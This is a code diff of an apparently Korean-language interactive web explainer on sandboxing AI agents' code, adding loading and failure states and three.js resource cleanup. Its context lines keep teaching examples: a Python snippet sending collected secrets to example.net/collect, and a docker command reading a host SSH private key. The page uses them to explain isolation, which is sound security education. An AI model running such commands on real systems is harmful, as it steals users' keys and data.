@@ -138,8 +138,13 @@
   .legend { position: absolute; left: 1.3rem; bottom: 1.1rem; z-index: 2; display: flex; flex-wrap: wrap; gap: 0.4rem 1.2rem; font-size: 0.82rem; color: var(--ink-soft); pointer-events: none; }
   .legend i { display: inline-block; width: 0.75rem; height: 0.75rem; border-radius: 2px; margin-right: 0.4rem; vertical-align: -1px; }
   .hint { position: absolute; right: 1.3rem; bottom: 1.1rem; z-index: 2; font-size: 0.82rem; color: var(--ink-soft); pointer-events: none; }
-  .fallback { position: absolute; inset: 0; display: none; place-items: center; padding: 2rem; text-align: center; color: var(--ink-soft); }
-  .stage.no-webgl .fallback { display: grid; }
+  /* Loading and failure notices do not depend on the CDN or a working renderer. */
+  .fallback { position: absolute; inset: 0; display: grid; align-content: center; justify-items: center; gap: 1rem; padding: 2rem; text-align: center; color: var(--ink-soft); }
+  .fallback p { margin: 0; max-width: 32rem; }
+  .retry-load { min-height: 44px; padding: 0.6rem 1rem; border: 1px solid var(--rule); border-radius: 6px; background: var(--paper); color: var(--ink); font: 500 0.95rem/1.4 var(--sans); cursor: pointer; }
+  .stage[data-state="ready"] .fallback { display: none; }
+  .stage:not([data-state="ready"]) :is(.canvas-wrap, .hud, .legend, .hint) { visibility: hidden; }
+  button:disabled { cursor: default; opacity: 0.5; }
 
   /* Shared by phones and narrow screens (both the stacked layout and landscape mode).
      Split the stage into 3 rows, "title bar / 3D canvas / legend bar", so the title, buttons, and legend never sit on top of the model. */
@@ -198,6 +203,15 @@
     .hud button { padding: 0.5rem 0.7rem; font-size: 0.85rem; }
     .hud .autorun { gap: 0.4rem; }
   }
+  /* An unavailable model must not stay pinned over the reading area on small screens. */
+  @media (max-width: 860px), (orientation: landscape) and (max-height: 520px) {
+    .layout:has(.stage[data-state="failed"]) { grid-template-columns: minmax(0, 1fr); }
+    .stage[data-state="failed"] { position: static; grid-row: 1; height: auto; border-bottom: 1px solid var(--rule); }
+    .stage[data-state="failed"] :is(.canvas-wrap, .hud, .legend, .hint) { display: none; }
+    .stage[data-state="failed"] .fallback { position: static; padding: 1.25rem; }
+    .layout:has(.stage[data-state="failed"]) .text { grid-row: 2; border-right: 0; }
+    .layout:has(.stage[data-state="failed"]) [data-scene] { scroll-margin-top: 0; }
+  }
   @media (prefers-reduced-motion: reduce) {
     html { scroll-behavior: auto; }
     .chapter h2 .n { transition: none; }
@@ -244,7 +258,7 @@ urllib.request.urlopen("https://example.net/collect",
                        data=json.dumps(loot).encode())</code></pre>
       <p>막는 것이 없으면 세 단계가 모두 성공합니다. 코드는 실행한 사용자의 권한을 그대로 물려받기 때문입니다. 악의가 없어도 문제가 됩니다. 끝나지 않는 반복문이나 메모리를 수십 GB 잡는 코드도 같은 컴퓨터의 다른 일을 함께 멈춥니다.</p>
       <p class="gist">샌드박스는 코드를 상자에 넣어 상자 안에서 허락된 일만 하게 만드는 장치입니다. 상자를 만드는 방식에 따라 튼튼함과 비용이 달라집니다.</p>
-      <div class="act"><button type="button" data-run="bare">탈출 시도</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="bare">탈출 시도</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="kernel">
@@ -258,7 +272,7 @@ openat(AT_FDCWD, "/home/dev/.ssh/id_ed25519", O_RDONLY) = 3
 connect(4, {sa_family=AF_INET, sin_port=htons(443), ...}) = 0</code></pre>
       <p><code>read_text()</code>는 <code>openat</code>이 되고, <code>urlopen()</code>은 <code>connect</code>가 됩니다. 둘 다 커널이 <code>= 3</code>, <code>= 0</code>(성공)으로 답했기 때문에 일이 일어났습니다.</p>
       <p class="gist">코드가 하는 위험한 일은 모두 커널에 보내는 요청입니다. 격리는 그 요청을 어디서 막느냐로 나뉩니다.</p>
-      <div class="act"><button type="button" data-run="kernel">시스템 콜 보기</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="kernel">시스템 콜 보기</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="split">
@@ -279,7 +293,7 @@ connect(4, {sa_family=AF_INET, sin_port=htons(443), ...}) = 0</code></pre>
         </tbody>
       </table>
       <p class="gist">컨테이너는 같은 커널이 대답을 골라 주는 방식이고, 가상 머신은 대답하는 커널 자체가 다른 방식입니다.</p>
-      <div class="act"><button type="button" data-run="split">같은 질문 보내 보기</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="split">같은 질문 보내 보기</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="container">
@@ -299,7 +313,7 @@ docker run --rm --network none \
 docker run --runtime=runsc --rm ... </code></pre>
       <p>첫 명령의 코드에게는 <code>/work</code> 밖의 내 파일이 보이지 않고, 네트워크도 없습니다. 하지만 커널은 여전히 호스트와 같은 커널입니다.</p>
       <p class="gist">컨테이너는 보이는 것을 나누지만, 커널은 나누지 않습니다. gVisor는 그 사이에 대리 커널을 한 겹 더 세웁니다.</p>
-      <div class="act"><button type="button" data-run="container">탈출 시도</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="container">탈출 시도</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="socket">
@@ -312,7 +326,7 @@ docker run --rm -v /:/host alpine \
   cat /host/root/.ssh/id_ed25519</code></pre>
       <p>그래서 흔히 "샌드박스를 관리하는 서비스만 소켓을 갖게 한다"는 원칙을 둡니다. 샌드박스 안의 코드에는 물론 소켓을 주지 않고, 관리 서비스도 따로 떼어 둡니다. 관리 서비스가 뚫리면 샌드박스가 아무리 튼튼해도 서버 전체가 넘어가기 때문입니다. Claude Code 샌드박스 문서도 <code>/var/run/docker.sock</code>을 허용하면 사실상 호스트 전체에 접근하게 된다고 경고합니다.</p>
       <p class="gist">샌드박스를 관리하는 쪽이 가진 권한도 샌드박스 자체만큼 중요합니다.</p>
-      <div class="act"><button type="button" data-run="socket">관리 서비스가 뚫렸다고 가정하기</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="socket">관리 서비스가 뚫렸다고 가정하기</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="microvm">
@@ -327,7 +341,7 @@ docker run --rm -v /:/host alpine \
   http://localhost/actions</code></pre>
       <p>탈출하려면 게스트 커널과 하이퍼바이저를 모두 넘어야 합니다. 하이퍼바이저가 바깥에 열어 둔 기능은 커널보다 훨씬 적어서, 공격할 곳도 그만큼 적습니다.</p>
       <p class="gist">마이크로VM은 바닥까지 나눕니다. 그 대가로 KVM을 쓸 수 있는 리눅스 서버가 필요합니다.</p>
-      <div class="act"><button type="button" data-run="microvm">탈출 시도</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="microvm">탈출 시도</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="wasm">
@@ -344,7 +358,7 @@ await py.runPythonAsync(code);
 <span class="c">// code 안의 open("/home/dev/.ssh/id_ed25519")은</span>
 <span class="c">// 가상 파일 시스템에 없으므로 FileNotFoundError</span></code></pre>
       <p class="gist">WASM은 가장 좁은 상자이지만, 상자 안에서 쓸 수 있는 도구도 가장 적습니다.</p>
-      <div class="act"><button type="button" data-run="wasm">탈출 시도</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="wasm">탈출 시도</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="ossandbox">
@@ -373,7 +387,7 @@ await py.runPythonAsync(code);
       </ol>
       <p>한계도 문서에 적혀 있습니다. 프록시는 기본으로 암호화된 내용을 들여다보지 않고 호스트 이름만 봅니다. 그래서 <code>github.com</code>처럼 넓은 도메인을 허용하면 그 길로 데이터가 나갈 수 있습니다. 또 샌드박스는 기본으로 꺼져 있고, 켜 두어도 필요한 구성 요소가 없으면 기본 설정에서는 샌드박스 없이 명령을 실행합니다. 이때 시작을 멈추게 하려면 <code>sandbox.failIfUnavailable</code>을 켭니다.</p>
       <p class="gist">OS 샌드박스는 같은 컴퓨터, 같은 커널 위에서 "어디에 쓰고 어디로 나갈 수 있는지"만 좁힙니다. 가볍지만, 커널은 여전히 하나입니다.</p>
-      <div class="act"><button type="button" data-run="ossandbox">다섯 가지 시도</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="ossandbox">다섯 가지 시도</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="lifecycle">
@@ -389,7 +403,7 @@ pivot = df.pivot_table(index="month", values="amount")
 <span class="c"># 30분 뒤: 멈추고 스냅샷 저장</span>
 <span class="c"># 턴 3: 되살린 뒤 df, pivot을 이어서 쓴다</span></code></pre>
       <p class="gist">샌드박스는 만들고, 다시 쓰고, 멈추고, 되살리고, 치우는 수명을 가집니다. 상태를 남길수록 편하지만 자원을 오래 잡습니다.</p>
-      <div class="act"><button type="button" data-run="lifecycle">대화 재생</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="lifecycle">대화 재생</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="compare">
@@ -428,7 +442,7 @@ pivot = df.pivot_table(index="month", values="amount")
       </table>
       <p>예를 들어 내 노트북에서 에이전트에게 테스트를 돌리게 하는 정도라면 OS 샌드박스가 가장 손이 덜 갑니다. 여러 사용자의 코드를 한 서버에서 돌린다면 커널을 나누는 마이크로VM이나 대리 커널을 낀 컨테이너 쪽이 맞습니다. 계산만 하면 되는 짧은 코드라면 WASM으로 충분할 수 있습니다. 이 문단도 판단입니다.</p>
       <p class="gist">네 방식은 모두 막지만 막는 층이 다릅니다. 지키려는 대상과 코드에 필요한 도구로 고릅니다.</p>
-      <div class="act"><button type="button" data-run="compare">네 곳에서 탈출 시도</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="compare">네 곳에서 탈출 시도</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <!-- TEXT: 용어 정리와 출처. 확인한 날짜를 적는다. 출처가 없으면 sources 블록을 지운다. -->
@@ -473,9 +487,9 @@ pivot = df.pivot_table(index="month", values="amount")
 
   </article>
 
-  <aside class="stage" aria-label="샌드박스 3D 모형">
+  <aside class="stage" data-state="loading" aria-busy="true" aria-label="샌드박스 3D 모형">
     <div class="canvas-wrap"></div>
-    <div class="hud"><span class="now" aria-live="polite"></span><div class="tools"><button type="button" class="autorun" role="switch" aria-checked="false" aria-label="자동 실행" data-ui-aria="autorun"><span class="track" aria-hidden="true"></span><span aria-hidden="true"><span class="long" data-ui="autorun">자동 실행</span><span class="short" data-ui="autorunShort">자동</span></span></button><button type="button" class="reset-view" data-ui="resetView">시점 되돌리기</button></div></div>
+    <div class="hud"><span class="now" aria-live="polite"></span><div class="tools"><button type="button" disabled class="autorun" role="switch" aria-checked="false" aria-label="자동 실행" data-ui-aria="autorun"><span class="track" aria-hidden="true"></span><span aria-hidden="true"><span class="long" data-ui="autorun">자동 실행</span><span class="short" data-ui="autorunShort">자동</span></span></button><button type="button" disabled class="reset-view" data-ui="resetView">시점 되돌리기</button></div></div>
     <!-- TEXT: 범례. 의미 색 3개가 이 페이지에서 무엇을 뜻하는지 쓴다. -->
     <div class="legend" aria-hidden="true">
       <span><i style="background:var(--actor)"></i>에이전트가 짠 코드</span>
@@ -483,29 +497,18 @@ pivot = df.pivot_table(index="month", values="amount")
       <span><i style="background:var(--matter)"></i>데이터·비밀·파일</span>
     </div>
     <div class="hint" aria-hidden="true" data-ui="hint">드래그해서 돌려 보기</div>
-    <p class="fallback" data-ui="fallback">이 브라우저에서는 3D 모형을 그릴 수 없습니다. 본문만으로도 내용을 따라갈 수 있습니다.</p>
+    <div class="fallback" role="status" aria-live="polite">
+      <p data-ui="loading">3D 모형을 불러오는 중입니다. 기다리는 동안 본문을 읽을 수 있습니다.</p>
+      <button type="button" class="retry-load" data-ui="retry" hidden>다시 시도</button>
+    </div>
   </aside>
 </main>
 
 <script type="module">
-import * as THREE from 'three';
-import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
-import { CSS2DRenderer, CSS2DObject } from 'three/addons/renderers/CSS2DRenderer.js';
-
 /* =====================================================================
    ENGINE — everything you need to write scenes is here. Do not edit.
    API reference: references/engine-api.md
    ===================================================================== */
-const COLOR = {
-  model: 0xFBFBF8, ink: 0x1E2A33, outside: 0xEEF0F2, muted: 0xAEB6BC,
-  actor: 0xD2364A, actorEdge: 0x7A1422,
-  bound: 0x2F6FB2, boundSoft: 0xD3E0EE, boundMid: 0x9DBBE0,
-  matter: 0xC4921F, matterEdge: 0x6B4B0E,
-};
-const REDUCE = matchMedia('(prefers-reduced-motion: reduce)').matches;
-const CANCEL = Symbol('cancel');
-const V = (x, y, z) => new THREE.Vector3(x, y, z);
-
 /* ---- Screen text dictionary ----
    English (en) is the canonical text and the final fallback. <html lang> picks the language: ko* → ko, ja* → ja, zh* → zh-CN, anything else → en.
    Page-side overrides: in a <script> below the body, override keys or add a new language with window.UI_OVERRIDES = { es: { hint: '...' } }.
@@ -519,6 +522,9 @@ const UI_TEXT = {
     autorunShort: 'Auto',
     hint: 'Drag to rotate',
     fallback: "This browser can't draw the 3D model. You can still follow the content from the text alone.",
+    loading: 'Loading the 3D model… You can read the text while you wait.',
+    loadError: "Couldn't load the 3D model. Check your connection and try again, or keep reading the text.",
+    retry: 'Retry',
     stageAria: '3D model',
     terms: 'Glossary',
     sources: 'Sources (checked {date})',
@@ -532,6 +538,9 @@ const UI_TEXT = {
     autorunShort: '자동',
     hint: '드래그해서 돌려 보기',
     fallback: '이 브라우저에서는 3D 모형을 그릴 수 없습니다. 본문만으로도 내용을 따라갈 수 있습니다.',
+    loading: '3D 모형을 불러오는 중입니다. 기다리는 동안 본문을 읽을 수 있습니다.',
+    loadError: '3D 모형을 불러오지 못했습니다. 인터넷 연결을 확인하고 다시 시도하거나 본문을 계속 읽어 주세요.',
+    retry: '다시 시도',
     stageAria: '3D 모형',
     terms: '용어 정리',
     sources: '출처 ({date} 확인)',
@@ -545,6 +554,9 @@ const UI_TEXT = {
     autorunShort: '自動',
     hint: 'ドラッグで回転',
     fallback: 'このブラウザでは3Dモデルを表示できません。本文だけでも内容を追えます。',
+    loading: '3Dモデルを読み込んでいます。待っている間も本文を読めます。',
+    loadError: '3Dモデルを読み込めませんでした。接続を確認して再試行するか、本文を読み進めてください。',
+    retry: '再試行',
     stageAria: '3Dモデル',
     terms: '用語集',
     sources: '出典（{date} 確認）',
@@ -558,6 +570,9 @@ const UI_TEXT = {
     autorunShort: '自动',
     hint: '拖动旋转',
     fallback: '此浏览器无法显示 3D 模型。只看正文也能理解内容。',
+    loading: '正在加载 3D 模型…等待时可以先阅读正文。',
+    loadError: '无法加载 3D 模型。请检查网络连接后重试，或继续阅读正文。',
+    retry: '重试',
     stageAria: '3D 模型',
     terms: '术语表',
     sources: '来源（{date} 核对）',
@@ -592,15 +607,46 @@ function applyUiText() {
     el.setAttribute('aria-label', uiStr(key));
   });
 }
-applyUiText(); // Even if the script stops below because WebGL is missing, the fallback notice (.fallback) is already filled in that language.
+applyUiText(); // This module has no static CDN imports, so notices are translated before loading three.js.
 
 const stageEl = document.querySelector('.stage');
 const wrap = document.querySelector('.canvas-wrap');
+const stageControls = document.querySelectorAll('[data-run], .autorun, .reset-view');
+const retryBtn = document.querySelector('.retry-load');
+function setStageState(state, message = 'loading') {
+  stageEl.dataset.state = state;
+  stageEl.setAttribute('aria-busy', String(state === 'loading'));
+  stageControls.forEach(button => { button.disabled = state !== 'ready'; });
+  const notice = stageEl.querySelector('.fallback p');
+  notice.dataset.ui = message;
+  notice.textContent = uiStr(message);
+  retryBtn.hidden = state !== 'failed';
+}
+retryBtn.addEventListener('click', () => location.reload());
+setStageState('loading');
+
+let failureMessage = 'loadError';
+try {
+const [THREE, { OrbitControls }, { CSS2DRenderer, CSS2DObject }] = await Promise.all([
+  import('three'),
+  import('three/addons/controls/OrbitControls.js'),
+  import('three/addons/renderers/CSS2DRenderer.js'),
+]);
+const COLOR = {
+  model: 0xFBFBF8, ink: 0x1E2A33, outside: 0xEEF0F2, muted: 0xAEB6BC,
+  actor: 0xD2364A, actorEdge: 0x7A1422,
+  bound: 0x2F6FB2, boundSoft: 0xD3E0EE, boundMid: 0x9DBBE0,
+  matter: 0xC4921F, matterEdge: 0x6B4B0E,
+};
+const REDUCE = matchMedia('(prefers-reduced-motion: reduce)').matches;
+const CANCEL = Symbol('cancel');
+const V = (x, y, z) => new THREE.Vector3(x, y, z);
+
 let renderer;
 try {
   renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
 } catch (e) {
-  stageEl.classList.add('no-webgl');
+  failureMessage = 'fallback';
   throw e;
 }
 renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
@@ -690,7 +736,7 @@ function block(w, h, d, pos, { color = COLOR.model, opacity = 1, edge = COLOR.in
   g.userData.h = h;
   return g;
 }
-const allTags = [];
+const allTags = new Set();
 // On-screen label. kind: '' | 'actor' | 'bound' | 'matter' | 'warn' | 'big'
 function tag(text, pos, kind = '') {
   const el = document.createElement('div');
@@ -698,8 +744,48 @@ function tag(text, pos, kind = '') {
   el.textContent = text;
   const o = new CSS2DObject(el);
   o.position.set(pos[0], pos[1], pos[2]);
-  allTags.push(o);
+  allTags.add(o);
   return o;
+}
+// Temporary groups contain one-shot objects created during playback. Shared resources stay externally owned.
+const temporaryGroups = new WeakMap();
+function temporaryGroup(sharedResources = []) {
+  const group = new THREE.Group();
+  temporaryGroups.set(group, new Set(sharedResources));
+  return group;
+}
+// Release an owned subtree. Keep externally owned geometry/materials in sharedResources or its temporary group's list.
+function disposeObject(root, sharedResources = []) {
+  disposeObjects([root], sharedResources);
+}
+function disposeObjects(roots, sharedResources = []) {
+  const shared = new Set(sharedResources), resources = new Set();
+  for (const root of roots) {
+    for (let node = root; node; node = node.parent) {
+      for (const resource of temporaryGroups.get(node) || []) shared.add(resource);
+    }
+    root.traverse(o => {
+      for (const resource of temporaryGroups.get(o) || []) shared.add(resource);
+      if (o.isCSS2DObject) {
+        allTags.delete(o);
+        labelState.delete(o);
+        o.element.remove();
+      }
+      if (o.geometry) resources.add(o.geometry);
+      for (const material of Array.isArray(o.material) ? o.material : [o.material]) {
+        if (material) resources.add(material);
+      }
+    });
+    root.removeFromParent();
+  }
+  for (const resource of resources) if (!shared.has(resource)) resource.dispose();
+}
+function clearGroup(group) {
+  disposeObjects([...group.children]);
+}
+function clearTemporary(root) {
+  if (temporaryGroups.has(root)) { clearGroup(root); return; }
+  for (const child of root.children) clearTemporary(child);
 }
 // Actor cube (0.6). Pass label as null for no label.
 function actorCube(pos, label = '__actor__') {
@@ -738,7 +824,7 @@ function arrow(from, to, color = COLOR.ink) {
   g.add(cone);
   return g;
 }
-// Moving ball (request, signal). Put it in the scene's temp group and remove it when done.
+// Moving ball (request, signal). Put it in a temporaryGroup() and disposeObject() when done.
 function packet(color, pos, r = 0.2) {
   const m = new THREE.Mesh(new THREE.SphereGeometry(r, 20, 14), mat(color));
   m.position.set(...pos);
@@ -928,7 +1014,7 @@ defineScene('bare', {
   title: '1  막는 것이 없을 때',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     g.add(block(3, 1.3, 2.2, [1.2, FLOOR, 1.2]));
     g.add(tag('에이전트 프로세스', [1.2, FLOOR + 0.65, 2.42]));
     const actor = actorCube([1.2, FLOOR + 1.3, 1.2], CODE);
@@ -939,7 +1025,7 @@ defineScene('bare', {
     actor.add(loot);
     return {
       group: g,
-      reset() { actor.position.copy(home); loot.visible = false; temp.clear(); },
+      reset() { actor.position.copy(home); loot.visible = false; clearGroup(temp); },
       async run(a, say) {
         say('1번: 코드가 환경 변수와 키 파일을 읽으러 갑니다.');
         await a.move(actor, [-4.15, FLOOR + 1.25, -2.9], 1000, 1.2);
@@ -960,7 +1046,7 @@ defineScene('kernel', {
   title: '2  모든 요청은 커널을 지나간다',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     g.add(block(3, 1.3, 2.2, [1.2, FLOOR, 1.2]));
     g.add(tag('에이전트 프로세스', [1.2, FLOOR + 0.65, 2.42]));
     g.add(block(1.6, 1.0, 1.6, [4.3, FLOOR, 1.6]));
@@ -975,7 +1061,7 @@ defineScene('kernel', {
     ];
     return {
       group: g,
-      reset() { temp.clear(); },
+      reset() { clearGroup(temp); },
       async run(a, say) {
         for (const c of calls) {
           const p = packet(COLOR.actor, src, 0.17);
@@ -987,7 +1073,7 @@ defineScene('kernel', {
           await a.move(p, [c.target[0], FLOOR + 0.08, c.target[2]], 800);
           await a.move(p, c.target, 400);
           if (c.hit) await a.flash(c.hit, COLOR.actor, 500);
-          temp.remove(p);
+          disposeObject(p);
         }
         say('openat, connect, mmap이 모두 같은 커널을 거쳐 갔습니다. 커널이 허락해서 일이 일어났습니다.');
       },
@@ -1000,7 +1086,7 @@ defineScene('container', {
   title: '4  컨테이너',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const A = glass(3.2, 2.4, 3.0, [1.0, FLOOR, 1.2]);
     const B = glass(2.4, 1.9, 2.4, [4.5, FLOOR, 1.4]);
     const C = glass(2.4, 1.9, 2.2, [2.4, FLOOR, -2.4]);
@@ -1019,7 +1105,7 @@ defineScene('container', {
     g.add(crack);
     return {
       group: g,
-      reset() { actor.position.copy(home); crack.visible = false; gv.visible = false; gv.scale.setScalar(1); temp.clear(); },
+      reset() { actor.position.copy(home); crack.visible = false; gv.visible = false; gv.scale.setScalar(1); clearGroup(temp); },
       async run(a, say) {
         say('1. 코드가 방 밖의 키 파일 쪽으로 나가려고 합니다.');
         await a.move(actor, [-0.25, FLOOR + 0.9, 1.2], 700, 0.5);
@@ -1055,7 +1141,7 @@ defineScene('socket', {
   fitH: 12.5,
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const service = block(2.4, 1.3, 1.8, [0.3, FLOOR, 2.7]);
     const daemon = block(2.0, 1.6, 1.8, [-4.6, FLOOR, 0.5], { color: COLOR.outside });
     g.add(service, daemon);
@@ -1078,7 +1164,7 @@ defineScene('socket', {
     const home = actor.position.clone();
     return {
       group: g,
-      reset() { actor.position.copy(home); evil.visible = false; evil.scale.setScalar(1); temp.clear(); },
+      reset() { actor.position.copy(home); evil.visible = false; evil.scale.setScalar(1); clearGroup(temp); },
       async run(a, say) {
         say('관리 서비스에 결함이 있어 코드가 서비스 쪽으로 빠져나왔다고 가정합니다.');
         await a.move(actor, [0.3, FLOOR + 1.6, 2.7], 1000, 1.2);
@@ -1116,7 +1202,7 @@ defineScene('microvm', {
   title: '6  마이크로VM',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const hyper = block(9.6, 0.25, 6.4, [1.6, FLOOR, 0], { color: COLOR.boundMid, edge: COLOR.bound });
     g.add(hyper);
     g.add(tag('하이퍼바이저 (KVM)', [-3.2, FLOOR + 0.12, 3.2], 'bound'));
@@ -1129,7 +1215,7 @@ defineScene('microvm', {
     const home = actor.position.clone();
     return {
       group: g,
-      reset() { actor.position.copy(home); temp.clear(); },
+      reset() { actor.position.copy(home); clearGroup(temp); },
       async run(a, say) {
         say('1. 코드가 VM 벽을 넘으려고 합니다.');
         await a.move(actor, [-0.6, Y1 + 1.2, 1.4], 700, 0.5);
@@ -1145,7 +1231,7 @@ defineScene('microvm', {
         await a.move(p, [0.6, FLOOR + 0.12, 1.4], 500);
         await a.flash(hyper, COLOR.bound, 800);
         await a.move(p, [0.6, Y1 + 0.6, 1.4], 500);
-        temp.remove(p);
+        disposeObject(p);
         say('3. 그 아래 하이퍼바이저에서 다시 막혔습니다. 호스트 커널과 다른 VM에는 닿지 못했습니다.');
       },
     };
@@ -1169,7 +1255,7 @@ defineScene('split', {
       const k = block(5.8, 0.4, 5.8, [0, 0.5, 0], { color: COLOR.boundSoft });
       s.add(k);
       s.add(tag('호스트 커널', [2.95, 0.7, 0], 'bound'));
-      const temp = new THREE.Group();
+      const temp = temporaryGroup();
       s.add(temp);
       g.add(s);
       return { s, k, temp };
@@ -1202,14 +1288,14 @@ defineScene('split', {
     };
     return {
       group: g,
-      reset() { L.temp.clear(); R.temp.clear(); },
+      reset() { clearGroup(L.temp); clearGroup(R.temp); },
       async run(a, say) {
         say('컨테이너 쪽: 두 프로그램이 똑같이 ls /data 로 파일 목록을 묻습니다.');
         let qs = spots.map(([x, z]) => { const p = packet(COLOR.actor, [x, Y + 0.9, z], 0.15); L.temp.add(p); return p; });
         await Promise.all(qs.map(p => a.move(p, [p.position.x, Y + 0.1, p.position.z], 500)));
         await Promise.all(qs.map(p => a.move(p, [0, Y + 0.1, 0], 700)));
         await a.flash(L.k, COLOR.bound, 800);
-        qs.forEach(p => L.temp.remove(p));
+        qs.forEach(p => disposeObject(p));
         say('두 질문이 같은 호스트 커널로 모였습니다. 커널은 묻는 쪽을 보고 그 몫의 파일만 골라 돌려줬습니다.');
         const la = names.map((n, i) => { const f = answer(L, `${n}의 파일`, i); f.position.set(0, Y + 0.1, 0); return f; });
         await Promise.all(la.map((f, i) => a.move(f, [spots[i][0] + 0.55, Y + 0.08, spots[i][1] - 0.55], 800, 0.9)));
@@ -1218,7 +1304,7 @@ defineScene('split', {
         qs = spots.map(([x, z]) => { const p = packet(COLOR.actor, [x, vmFloor + 1.2, z], 0.15); R.temp.add(p); return p; });
         await Promise.all(qs.map(p => a.move(p, [p.position.x, vmFloor + 0.35, p.position.z], 500)));
         await Promise.all(vms.map(v => a.flash(v.gk, COLOR.bound, 800)));
-        qs.forEach(p => R.temp.remove(p));
+        qs.forEach(p => disposeObject(p));
         const ra = names.map((n, i) => {
           const f = answer(R, `${n}의 디스크`, i);
           f.position.set(spots[i][0] + 0.55, vmFloor + 0.38, spots[i][1] - 0.55);
@@ -1237,7 +1323,7 @@ defineScene('wasm', {
   title: '7  WASM',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     g.add(block(5.0, 0.8, 4.0, [1.0, FLOOR, 0.8]));
     g.add(tag('WASM 런타임', [1.0, FLOOR + 0.4, 2.9]));
     const R = 1.85;
@@ -1269,7 +1355,7 @@ defineScene('wasm', {
     const toward = (target, k) => center.clone().add(V(...target).sub(center).normalize().multiplyScalar(k));
     return {
       group: g,
-      reset() { actor.position.copy(home); temp.clear(); },
+      reset() { actor.position.copy(home); clearGroup(temp); },
       async run(a, say) {
         say('1. 코드가 키 파일 쪽으로 나가려고 합니다.');
         await a.move(actor, toward([-4.15, FLOOR + 1, -2.9], R - 0.4), 600);
@@ -1305,7 +1391,7 @@ defineScene('ossandbox', {
   title: '8  OS 샌드박스',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const box = glass(3.4, 2.2, 3.0, [1.2, FLOOR, 1.2], { opacity: 0.06 });
     g.add(box);
     g.add(tag('샌드박스 정책', [1.2, FLOOR + 2.55, 1.2], 'bound'));
@@ -1326,7 +1412,7 @@ defineScene('ossandbox', {
     const P = [4.6, FLOOR + 0.75, 0];
     return {
       group: g,
-      reset() { actor.position.copy(home); loot.visible = false; temp.clear(); },
+      reset() { actor.position.copy(home); loot.visible = false; clearGroup(temp); },
       async run(a, say) {
         say('1. 코드가 작업 폴더에 결과 파일을 씁니다.');
         await a.move(actor, [1.5, FLOOR + 0.45, 1.7], 600, 0.4);
@@ -1347,7 +1433,7 @@ defineScene('ossandbox', {
         await a.move(r, [-4.15, FLOOR + 1.0, -2.9], 900, 1.0);
         await a.flash(files[1], COLOR.actor, 600);
         await a.move(r, [home.x, home.y + 0.3, home.z], 800, 1.0);
-        temp.remove(r);
+        disposeObject(r);
         loot.visible = true;
         say('3. 기본 설정에서는 키 파일이 읽혔습니다. 읽기는 대부분 허용되기 때문입니다.');
         await a.wait(1200);
@@ -1355,7 +1441,7 @@ defineScene('ossandbox', {
         const s1 = packet(COLOR.matter, [home.x, home.y + 0.4, home.z], 0.17); temp.add(s1);
         await a.move(s1, [4.15, FLOOR + 0.75, 0], 900, 0.6);
         await a.flash(proxy, COLOR.bound, 800);
-        temp.remove(s1);
+        disposeObject(s1);
         say('4. example.net은 허용 목록에 없어서 프록시에서 멈췄습니다.');
         await a.wait(1100);
         say('5. 허용 목록에 넣은 pypi.org 로 요청을 보냅니다.');
@@ -1363,7 +1449,7 @@ defineScene('ossandbox', {
         await a.move(s2, P, 900, 0.6);
         await a.move(s2, GATE, 500);
         await a.move(s2, OUT, 500);
-        temp.remove(s2);
+        disposeObject(s2);
         say('5. pypi.org는 허용 목록에 있어서 프록시를 지나 인터넷으로 나갔습니다.');
       },
     };
@@ -1375,7 +1461,7 @@ defineScene('lifecycle', {
   title: '9  샌드박스의 하루',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const slotX = [-0.9, 2.0, 4.9], slotZ = 0.9, S = 2.6;
     slotX.forEach(x => {
       const h = S / 2;
@@ -1412,7 +1498,7 @@ defineScene('lifecycle', {
     return {
       group: g,
       reset() {
-        temp.clear();
+        clearGroup(temp);
         A.position.copy(slot0); A.scale.setScalar(0.001); A.visible = false;
